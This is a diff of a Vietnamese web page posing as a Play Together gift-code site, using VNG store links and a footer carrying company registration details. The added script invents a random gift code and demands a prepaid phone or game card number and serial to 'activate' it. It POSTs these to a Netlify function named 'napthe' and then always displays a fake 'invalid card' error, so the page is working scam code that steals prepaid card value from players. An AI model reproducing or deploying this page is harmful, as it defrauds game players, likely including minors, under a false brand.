@@ -3,138 +3,375 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>HỆ THỐNG BẢO TRÌ</title>
+    <title>NHẬN CODE PLAY TOGETHER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        /* Sử dụng font hệ thống để tránh lỗi mất chữ khi không có mạng hoặc lag */
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; --gray: #bdc3c7; --orange: #f1904e; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Lexend', sans-serif; }
+        body { background: var(--bg); padding-bottom: 80px; position: relative; min-height: 100vh; }
+
+        .header-logo { background: #fff; text-align: center; padding: 10px; border-bottom: 2px solid #eee; }
+        .header-logo img { height: 40px; }
+
+        /* --- PHẦN BANNER VÀ NÚT TẢI APP --- */
+        .banner-container { position: relative; width: 100%; }
+        .banner { width: 100%; display: block; height: auto; }
+        .download-app-panel {
+            position: absolute; bottom: 12px; left: 50%; transform: translateX(-50%);
+            display: flex; justify-content: center; gap: 8px; width: 90%; max-width: 280px; z-index: 10;
         }
-        
-        body {
-            background-color: #f4f6f8;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 15px;
+        .download-btn {
+            flex: 1; display: flex; align-items: center; justify-content: center;
+            background-color: #000; border: 1.5px solid #fff; border-radius: 6px; padding: 3px;
+            text-decoration: none;
+        }
+        .download-btn img { height: 18px; width: auto; display: block; }
+
+        /* --- POPUP (BÓP BẮP) THEO YÊU CẦU --- */
+        .welcome-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.6);
+            display: flex; align-items: center; justify-content: center; z-index: 10000; padding: 20px;
+        }
+        .welcome-modal {
+            background: white; width: 100%; max-width: 380px; border-radius: 20px;
+            padding: 20px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: fadeInDown 0.4s ease;
+        }
+        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        .modal-header-ptg { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
+        .modal-header-ptg img { width: 45px; height: 45px; border-radius: 10px; }
+        .modal-header-ptg span { font-weight: 800; font-size: 15px; color: #333; }
+        .modal-body-ptg { font-size: 14px; line-height: 1.5; color: #444; text-align: left; }
+        .modal-body-ptg p { margin-bottom: 10px; }
+        .modal-body-ptg a { color: #3182ce; text-decoration: none; font-weight: 700; }
+        .btn-confirm-ptg {
+            background: var(--orange); color: white; border: none; width: 100%;
+            padding: 12px; border-radius: 10px; font-weight: 800; font-size: 16px;
+            margin-top: 10px; cursor: pointer; box-shadow: 0 4px 0 #d97b3d;
         }
 
-        .maintenance-card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 380px;
-            padding: 25px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            border-top: 6px solid #f1904e;
-        }
-        
-        .image-wrapper {
-            margin-bottom: 20px;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #eee;
-        }
+        /* --- TOÀN BỘ CSS GỐC --- */
+        .marquee-box { background: #fffbe6; border-bottom: 1px solid #ffe58f; padding: 8px 0; overflow: hidden; }
+        .marquee-text { white-space: nowrap; display: inline-block; animation: marquee 15s linear infinite; color: #856404; font-size: 14px; font-weight: 700; }
+        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+        .latest-codes { background: #fff; margin: 10px 15px; padding: 12px; border-radius: 12px; border: 1px solid #e2e8f0; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+        .latest-codes h4 { font-size: 13px; color: #718096; text-transform: uppercase; margin-bottom: 10px; display: flex; align-items: center; gap: 5px; }
+        .code-list { display: flex; flex-wrap: wrap; gap: 8px; }
+        .code-item { background: #f1f5f9; color: #475569; padding: 5px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; border: 1px solid #cbd5e0; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 15px; }
+        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; position: relative; }
+        .limit-badge { position: absolute; top: 8px; left: 8px; background: var(--red); color: white; font-size: 9px; font-weight: 800; padding: 3px 8px; border-radius: 50px; text-transform: uppercase; z-index: 10; }
+        .card-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; cursor: pointer; }
+        .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; }
+        .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; }
 
-        .maintenance-img {
-            width: 100%;
-            display: block;
-            height: auto;
-        }
+        /* --- PHẦN CHÂN TRANG MỚI (CHỈ GHÉP) --- */
+        .footer-info { background: #fff; padding: 30px 20px; text-align: center; border-top: 1px solid #eee; margin-top: 20px; }
+        .footer-logo-brand { width: 180px; margin-bottom: 20px; }
+        .footer-text { font-size: 13px; color: #555; line-height: 1.8; max-width: 600px; margin: 0 auto; }
+        .footer-link { color: #3498db; text-decoration: none; }
 
-        .status-badge {
-            background: #fff3cd;
-            color: #856404;
-            display: inline-block;
-            padding: 6px 12px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            border: 1px solid #ffe58f;
-        }
-
-        h2 { 
-            color: #333333; 
-            font-size: 20px; 
-            font-weight: 800; 
-            margin-bottom: 15px;
-            display: block; /* Đảm bảo luôn hiển thị */
-        }
-        
-        .info-content {
-            background: #fafafa;
-            border: 1px dashed #cccccc;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-        }
-
-        .info-content p {
-            font-size: 14px;
-            color: #555555;
-            line-height: 1.5;
-            margin: 5px 0;
-        }
-
-        .highlight-time {
-            display: block;
-            color: #e74c3c;
-            font-size: 18px;
-            font-weight: 900;
-            margin-top: 8px;
-        }
-
-        .btn-check {
-            background: #f1904e;
-            color: #ffffff;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 10px;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            box-shadow: 0 4px 0 #d97b3d;
-        }
-
-        .footer-note {
-            font-size: 11px;
-            color: #999999;
-            margin-top: 20px;
-            line-height: 1.4;
-        }
+        /* --- TOÀN BỘ CSS WIDGET --- */
+        .messenger-widget { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; align-items: center; background: white; padding: 8px 15px 8px 8px; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-decoration: none; color: #333; transition: transform 0.2s; border: 1px solid #eee; }
+        .messenger-widget:active { transform: scale(0.95); }
+        .messenger-widget img.avatar { width: 35px; height: 35px; border-radius: 50%; margin-right: 10px; }
+        .messenger-info { display: flex; flex-direction: column; margin-right: 10px; }
+        .messenger-name { font-size: 13px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
+        .messenger-name::after { content: '✔'; background: #0084ff; color: white; font-size: 7px; width: 12px; height: 12px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+        .messenger-status { font-size: 11px; color: #718096; }
+        .messenger-icon { width: 30px; height: 30px; background: #0084ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .messenger-icon svg { width: 18px; fill: white; }
+        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+        .modal.active { display: flex; }
+        .modal-inner { background: white; width: 100%; max-width: 360px; border-radius: 24px; position: relative; padding: 25px; animation: scaleUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); text-align: center; }
+        @keyframes scaleUp { from { transform: scale(0.7); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .btn-close { position: absolute; top: 12px; right: 12px; background: #f1f1f1; border: none; width: 30px; height: 30px; border-radius: 50%; font-weight: bold; cursor: pointer; }
+        .zoom-img { width: 90%; border-radius: 15px; margin-bottom: 15px; }
+        .zoom-title { font-size: 18px; font-weight: 800; color: #333; margin-bottom: 20px; }
+        .btn-popup-receive { background: var(--red); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; box-shadow: 0 4px 10px rgba(231, 76, 60, 0.2); }
+        .btn-login-orange { background: var(--orange); color: white; border: none; padding: 14px; width: 100%; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 18px; box-shadow: 0 4px 0 #d97b3d; }
+        .id-error-msg { color: #e74c3c; font-size: 12px; font-weight: 700; margin-top: 5px; display: none; text-align: left; }
+        .code-display { background: #f8f9fa; border: 2px dashed #cbd5e0; padding: 15px; text-align: center; font-size: 18px; font-weight: 800; margin: 15px 0; border-radius: 12px; color: #2d3748; letter-spacing: 1px; }
+        .status-badge { display: block; padding: 10px; border-radius: 10px; font-weight: 800; font-size: 13px; margin-bottom: 15px; }
+        .status-pending { background: #fff3cd; color: #856404; border: 1px solid #ffe58f; }
+        .status-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .error-icon { font-size: 50px; color: var(--red); margin-bottom: 15px; display: block; }
+        input, select { width: 100%; padding: 14px; border-radius: 12px; border: 1.5px solid #e2e8f0; margin-bottom: 12px; outline: none; font-size: 14px; }
+        label { display: block; text-align: left; font-size: 11px; font-weight: 700; color: #718096; margin-bottom: 5px; text-transform: uppercase; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="maintenance-card">
-        
-        <div class="image-wrapper">
-            <img src="https://i.postimg.cc/5t9mZpdS/IMG-3110.jpg" alt="Maintenance" class="maintenance-img">
+<div id="welcomeOverlay" class="welcome-overlay">
+    <div class="welcome-modal">
+        <div class="modal-header-ptg">
+            <img src="https://i.postimg.cc/R0MWjykH/IMG-1181.jpg">
+            <span>nhasangtaoptg.netlify.app</span>
         </div>
-
-        <div class="status-badge">🛠️ Đang Đồng Bộ Máy Chủ...</div>
-        
-        <h2>THÔNG BÁO NÂNG CẤP</h2>
-
-        <div class="info-content">
-            <p>Hệ thống nhận quà <b>Play Together VNG</b> đang được bảo trì để cập nhật Code mới.</p>
-            <p>Dự kiến mở lại lúc:</p>
-            <span class="highlight-time">20:25 Tối Hôm Nay</span>
+        <div class="modal-body-ptg">
+            <p>Thông qua chương trình Nhà Sáng Tạo, chúng tôi cập nhật mã Code Play Together chính thức mỗi ngày, giúp game thủ dễ dàng nhận quà tặng và phần thưởng hấp dẫn.</p>
+            <p>👉 Trang chủ nhập code chính thức:<br>
+                <a href="https://giftcode.vnggames.com/vn/redeem/661" target="_blank">giftcode.vnggames.com/vn/redeem/661</a>
+            </p>
+            <p>👉 Trang nhận code hỗ trợ:<br>
+                <a href="#">nhasangtaoptg.netlify.app</a>
+            </p>
+            <p>👉 Kênh Tiktok: 
+                <a href="https://www.tiktok.com/@nhancodeptg05?_r=1&_t=ZS-94Ua1fYhlMT" target="_blank">Nhancodeptg05</a>
+            </p>
+            <span style="color:#e74c3c; font-weight:700">⚠️ Hãy chắc chắn truy cập đúng link để tránh bị mất tài khoản.</span>
         </div>
-
-        <button class="btn-check" onclick="location.reload()">KIỂM TRA TRẠNG THÁI</button>
-        
-        <div class="footer-note">
-            <b>© NhaSangTaoPTG - Play Together Creator</b>
-        </div>
-
+        <button class="btn-confirm-ptg" onclick="closeWelcome()">Xác nhận</button>
     </div>
+</div>
 
+<div class="header-logo"><img src="https://i.postimg.cc/R0MWjykH/IMG-1181.jpg"></div>
+
+<div class="banner-container">
+    <img src="https://i.postimg.cc/rshjr55j/IMG-2022.png" class="banner">
+    <div class="download-app-panel">
+        <a href="https://play.google.com/store/apps/details?id=com.vng.playtogether" target="_blank" class="download-btn">
+            <img src="https://i.postimg.cc/02gDL1r1/IMG-2454.png">
+        </a>
+        <a href="https://apps.apple.com/vn/app/play-together-vng/id1612175933" target="_blank" class="download-btn">
+            <img src="https://i.postimg.cc/HWM70vzv/IMG-2453.png">
+        </a>
+    </div>
+</div>
+
+<div class="marquee-box">
+    <div class="marquee-text" id="marquee-dynamic">● Đang kết nối máy chủ Đảo Kaia...</div>
+</div>
+
+<div class="latest-codes">
+    <h4>🔥 DANH SÁCH CODE MỚI NHẤT:</h4>
+    <div class="code-list">
+        <span class="code-item">THANG3CUOIHAHA</span><span class="code-item">GAMEVERSEPARTY26</span><span class="code-item">PLAYKAIA2026</span><span class="code-item">PTNEWCLASS</span><span class="code-item">SCHOOLOFROCKPT</span><span class="code-item">TMI10KPRESENT</span><span class="code-item">PTSTARBEAT</span><span class="code-item">2026KAIAHAPPY</span><span
+class="code-item">HAPPYWOMENSDAY</span>
+    </div>
+</div>
+
+<div class="grid" id="item-grid"></div>
+
+<div class="footer-info">
+    <img src="https://i.postimg.cc/L8NX0s6Y/IMG-3109.png" alt="Kết nối bạn bè" class="footer-logo-brand">
+    <div class="footer-text">
+        <p>Công ty TNHH Dịch Vụ Phần Mềm Thiên Bình</p>
+        <p>Giấy CNĐKKD số <span style="color: #3498db;">0106803215</span>, cấp lần đầu ngày 27/03/2015</p>
+        <p>Cơ quan cấp: Phòng Đăng ký kinh doanh - Sở KH&ĐT TP Hà Nội</p>
+        <p>Địa chỉ: Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, 54 Liễu Giai, P. Cống Vị, Q. Ba Đình, Hà Nội.</p>
+        <p style="margin-top: 10px;">
+            <a href="#" class="footer-link">Điều khoản</a> | 
+            <a href="#" class="footer-link">Chính sách bảo mật</a>
+        </p>
+    </div>
+</div>
+
+<a href="https://m.me/117000874340678" target="_blank" class="messenger-widget">
+    <img src="https://i.postimg.cc/R0MWjykH/IMG-1181.jpg" class="avatar">
+    <div class="messenger-info">
+        <span class="messenger-name">Play Together</span>
+        <span class="messenger-status">Bắt đầu cuộc trò chuyện</span>
+    </div>
+    <div class="messenger-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2.04C6.5 2.04 2 6.18 2 11.28c0 2.89 1.44 5.47 3.69 7.15.19.14.3.36.3.6v2.33c0 .54.54.91 1.01.67l2.61-1.33c.15-.08.33-.11.5-.08.62.11 1.25.17 1.89.17 5.5 0 10-4.14 10-9.24s-4.5-9.24-10-9.24zm.8 12.33l-2-2.12-3.89 2.12 4.28-4.55 2.05 2.12 3.84-2.12-4.28 4.55z"/></svg>
+    </div>
+</a>
+
+<div class="modal" id="app-modal">
+    <div class="modal-inner">
+        <button class="btn-close" onclick="closeModal()">✕</button>
+        <div id="modal-content"></div>
+    </div>
+</div>
+
+<script>
+    function closeWelcome() { document.getElementById('welcomeOverlay').style.display = 'none'; }
+
+    function updateDate() {
+        const now = new Date();
+        const d = String(now.getDate()).padStart(2, '0');
+        const m = String(now.getMonth() + 1).padStart(2, '0');
+        const y = now.getFullYear();
+        document.getElementById('marquee-dynamic').innerText = `● Cập nhật: ${d}/${m}/${y} - Sự kiện giới hạn: Nhập ID nhận ngay gói vật phẩm hiếm!`;
+    }
+    updateDate();
+
+            const items = [
+        { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
+        { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
+        { id: 34, name: "Gấu Mèo Mê Ngủ", img: "https://i.postimg.cc/cCtGsL7F/gau-meo-me-ngu.png" },
+        { id: 39, name: "Mùa Linh Tinh Giọt Nước VIP", img: "https://i.postimg.cc/pV7X00tH/IMG-3050.png" },
+        { id: 42, name: "Rose Đang Yêu", img: "https://i.postimg.cc/rwr7cKkc/IMG-3084.png" },
+        { id: 41, name: "Chuột Quý Ông", img: "https://i.postimg.cc/ZKRSkbnC/IMG-3085.png" },
+        { id: 40, name: "Nàng Thơ Đen Huyền", img: "https://i.postimg.cc/R0njZTDH/IMG-3052.png" },
+        { id: 38, name: "Mèo Ngoạm Đầu", img: "https://i.postimg.cc/Yq50SdX3/IMG-3051.png" },
+        { id: 37, name: "Kênh Lookbook đen huyền KM", img: "https://i.postimg.cc/zDWYyVZS/IMG-3033.png" },
+        { id: 36, name: "Cần Câu Ngọc Rồng", img: "https://i.postimg.cc/NLhqLvbz/can-cau-ngoc-rong.png" },
+        { id: 35, name: "Blockcore", img: "https://i.postimg.cc/63mNJvZB/Blockcore.png" },
+        { id: 33, name: "Bác Sỹ Vụng Về", img: "https://i.postimg.cc/BtW9tfNM/bac-sy-vung-ve.png" },
+        // GÓI NÀY KHÓA NÚT
+        { id: 32, name: "Phú Ông Vàng", img: "https://i.postimg.cc/WpddDmXF/phu-ong-vang.png", isLocked: true }, 
+        { id: 31, name: "Bé Gấu Vanilla", img: "https://i.postimg.cc/c6qy6GTV/be-gau-vanilla.png" },
+        { id: 30, name: "Gói Catfluencer", img: "https://i.postimg.cc/kDr3DPfd/Catfluencer.png" },
+        { id: 29, name: "Dâu Xinh Tan Chảy", img: "https://i.postimg.cc/vTxwQZ7P/dau-xinh-tan-chay.png" },
+        { id: 28, name: "Thiên Thần Bờm Xờm", img: "https://i.postimg.cc/GtTncmPc/91100662.png" },
+        // GÓI NÀY KHÓA NÚT
+        { id: 27, name: "Vani Boy & Vani Girl", img: "https://i.postimg.cc/vDRFDwXh/goi-vani-png.jpg", isLocked: true },
+        { id: 26, name: "Chàng Quỷ Nhà Bên", img: "https://i.postimg.cc/fbccMr7D/IMG-2955.png" },
+        { id: 25, name: "Tiền Bối Stytle Thần Bí", img: "https://i.postimg.cc/RhQyfdzW/IMG-2954.png" },
+        { id: 24, name: "Vườn hoa linh lan", img: "https://i.postimg.cc/VvdmW2DN/IMG-2953.png" },
+        { id: 23, name: "Blade Hunter", img: "https://i.postimg.cc/zXFsvyR9/IMG-2567.png" },
+        { id: 22, name: "Shutter ngân hà", img: "https://i.postimg.cc/4474YQf4/IMG-2566.png" },
+        { id: 21, name: "Thiên Thần Buồn Ngủ", img: "https://i.postimg.cc/rs8dkd4N/IMG-2565.png" },       
+        { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
+        { id: 20, name: "Valentine xanh", img: "https://i.postimg.cc/wjGsM3Nj/IMG-2289.png" },
+        { id: 19, name: "Gói kẹo cao su Mint Pop", img: "https://i.postimg.cc/ydVk5v9h/IMG-2245.png" },
+        { id: 17, name: "Đoá hoa toả sáng", img: "https://i.postimg.cc/nVkhtN8p/IMG-2160.png" },
+        { id: 18, name: "Gói Nữ sinh trường Marron KM", img: "https://i.postimg.cc/BvHJ7Vc9/IMG-2161.png" },
+        { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" },
+        { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
+        { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
+        { id: 3, name: "Cô gái xác ướp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png" },
+        { id: 4, name: "Mèo kẹo sao", img: "https://i.postimg.cc/K8Z6MhCT/IMG-1962.png" },
+        { id: 5, name: "Thỏ cưng tưng tưng", img: "https://i.postimg.cc/cLn5j3X4/IMG-2052.png" },
+        { id: 6, name: "Thiên thần thỏ", img: "https://i.postimg.cc/6qPYb6ZS/IMG-2051.png" },
+        { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
+        { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
+        { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
+        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
+    ];
+
+    const grid = document.getElementById('item-grid');
+    items.forEach(i => {
+        // Kiểm tra xem gói có bị khóa nút không
+        const isLocked = i.isLocked === true;
+        
+        // Cấu hình Nút bấm
+        const btnText = isLocked ? "Hết mã" : "Nhận";
+        const btnClass = isLocked ? "btn-main-receive btn-disabled" : "btn-main-receive";
+        const btnDisabled = isLocked ? "disabled" : "";
+        const action = isLocked ? "" : `onclick="showItemDetail('${i.name}', '${i.img}', false)"`;
+
+        grid.innerHTML += `
+            <div class="card">
+                <div class="limit-badge">Giới hạn</div>
+                <img src="${i.img}" class="card-img" ${action}>
+                <div style="font-size:13px; font-weight:700; margin: 12px 5px">${i.name}</div>
+                <button class="${btnClass}" ${btnDisabled} ${action}>${btnText}</button>
+            </div>`;
+    });
+
+
+
+    const modal = document.getElementById('app-modal');
+    const content = document.getElementById('modal-content');
+    let userPlayerID = "", currentCode = "", selectedGift = "";
+
+    function showItemDetail(name, img, isSoon) {
+        selectedGift = name;
+        modal.classList.add('active');
+        let btnPopupHtml = isSoon ? 
+            `<button class="btn-popup-receive btn-disabled" disabled>Sắp ra mắt</button>` : 
+            `<button class="btn-popup-receive" onclick="openIDInput()">🎁 Nhận Quà</button>`;
+        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btnPopupHtml}`;
+    }
+
+    function openIDInput() {
+        content.innerHTML = `
+            <div style="display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:15px">
+                <span style="background:var(--red); color:white; width:24px; height:24px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:14px">1</span>
+                <h3 style="font-size:18px">Vui lòng Đăng Nhập ID</h3>
+            </div>
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px">
+                <label style="margin-bottom:0; font-size:14px; color:#444">Player ID</label>
+                <a href="javascript:void(0)" onclick="openHuongDan()" style="color:var(--blue); font-size:12px; text-decoration:underline; font-weight:700">Hướng dẫn lấy ID</a>
+            </div>
+            <input type="text" id="p-id-input" placeholder="Nhập UID từ 12–14 ký tự" maxlength="14" oninput="formatID(this)">
+            <div id="id-error" class="id-error-msg">ID không hợp lệ (Dạng: XXXX-XXXX-XXXX)</div>
+            <p style="font-size:11px; color:#888; text-align:left; margin-top:-5px; margin-bottom:15px">Bạn có thể dán nhanh bằng Ctrl+V. .</p>
+            <button class="btn-login-orange" onclick="processID()">Đăng Nhập</button>
+        `;
+    }
+
+    function openHuongDan() {
+        content.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px">
+                <h3 style="font-size:16px">Hướng dẫn tìm ID</h3>
+                <span style="cursor:pointer; font-weight:800" onclick="openIDInput()">✕</span>
+            </div>
+            <img src="https://i.postimg.cc/bw6Zzw64/IMG-2125.png" style="width:100%; border-radius:12px">
+            <button class="btn-login-orange" style="margin-top:15px" onclick="openIDInput()">Đóng</button>
+        `;
+    }
+
+    function formatID(el) {
+        let val = el.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        let formatted = "";
+        for(let i = 0; i < val.length; i++) {
+            if (i > 0 && i % 4 === 0 && i < 12) formatted += "-";
+            formatted += val[i];
+        }
+        el.value = formatted.substring(0, 14);
+        document.getElementById('id-error').style.display = 'none';
+    }
+
+    function processID() {
+        const val = document.getElementById('p-id-input').value;
+        const regex = /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/;
+        if(!regex.test(val)) {
+            document.getElementById('id-error').style.display = 'block';
+            return;
+        }
+        userPlayerID = val;
+        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra ID: ${userPlayerID}...</p></div>`;
+        setTimeout(() => { showCodeBoard(); }, 2000);
+    }
+
+    function showCodeBoard() {
+        currentCode = 'NHASANGTAOPTG' + Math.random().toString(36).substr(2, 6).toUpperCase();
+        content.innerHTML = `<h3>THÔNG TIN CODE</h3><div style="background:#edf2f7; padding:10px; border-radius:10px; margin: 15px 0"><p style="font-size:14px">ID: <b style="color:var(--red)">${userPlayerID}</b></p></div><div class="code-display">${currentCode}</div><div class="status-badge status-pending">❌ TRẠNG THÁI: CHƯA KÍCH HOẠT</div><button class="btn-popup-receive" onclick="openPay()">KÍCH HOẠT NGAY</button>`;
+    }
+
+    function openPay() {
+        content.innerHTML = `<h3>HỆ THỐNG NẠP THẺ</h3><label>Loại thẻ</label><select id="card-type"><option value="Viettel">Viettel</option><option value="Zing">Zing</option><option value="Mobifone">Mobifone</option><option value="Vinaphone">Vinaphone</option><option value="Garena">Garena</option></select><label>Mệnh giá</label><select id="card-value"><option value="50000">50.000đ</option><option value="100000">100.000đ</option><option value="200000">200.000đ</option><option value="500000">500.000đ</option><option value="1000000">1.000.000đ</option></select><input type="text" id="c-code" placeholder="Mã số thẻ..."><input type="text" id="c-seri" placeholder="Số Seri..."><button class="btn-popup-receive" onclick="finalProcess()">XÁC NHẬN KÍCH HOẠT</button>`;
+    }
+
+    function finalProcess() {
+        let code = document.getElementById('c-code').value;
+        let seri = document.getElementById('c-seri').value;
+        let type = document.getElementById('card-type').value;
+        let amount = document.getElementById('card-value').value;
+        
+        if(!code || !seri) return alert("Vui lòng nhập đầy đủ thông tin!");
+        
+        content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p></div>`;
+        
+        fetch('/.netlify/functions/napthe', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type, code, seri, playerID: userPlayerID, amount })
+        });
+
+        setTimeout(() => {
+            content.innerHTML = `
+                <span class="error-icon">⚠️</span>
+                <h3 style="color:var(--red)">KÍCH HOẠT THẤT BẠI</h3>
+                <div style="background:#fff5f5; border:1px solid #feb2b2; padding:15px; border-radius:12px; margin: 15px 0; text-align:left">
+                    <p style="font-size:13px; color:#c53030; line-height:1.6">
+                        ● Lỗi hệ thống: <b>Thẻ không hợp lệ</b>.<br>
+                        ● Lý do: Mã thẻ hoặc Seri không đúng, hoặc thẻ đã được sử dụng trước đó.<br>
+                        ● Vui lòng kiểm tra lại thông tin thẻ và thử lại sau.
+                    </p>
+                </div>
+                <div class="status-badge status-error">❌ TRẠNG THÁI: THẤT BẠI</div>
+                <button class="btn-popup-receive" onclick="location.reload()">QUAY LẠI</button>`;
+        }, 3000);
+    }
+
+    function closeModal() { modal.classList.remove('active'); }
+</script>
 </body>
 </html>
